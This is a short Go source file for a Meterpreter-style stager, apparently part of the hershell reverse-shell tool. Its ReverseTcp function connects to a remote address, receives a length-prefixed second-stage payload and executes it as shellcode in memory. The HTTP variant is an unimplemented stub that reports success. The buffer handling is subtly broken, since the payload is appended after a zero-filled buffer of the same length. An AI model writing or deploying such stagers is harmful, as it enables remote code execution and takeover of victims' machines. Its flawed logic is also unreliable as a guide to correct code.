package meterpreter

import (
	"encoding/binary"
	"net"

	"github.com/sysdream/hershell/shell"
)

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}

func ReverseTcp(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		tmpBuf          []byte = make([]byte, 2048)
		read            int    = 0
		totalRead       int    = 0
		stage2LengthInt uint32 = 0
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}

	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	for totalRead < (int)(stage2LengthInt) {
		if read, err = conn.Read(tmpBuf); err != nil {
			return false, err
		}
		totalRead += read
		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
	}

	shell.ExecShellcode(stage2Buf)

	return true, nil
}

// TODO
func ReverseHttp(address string) (bool, error) {
	return true, nil
}
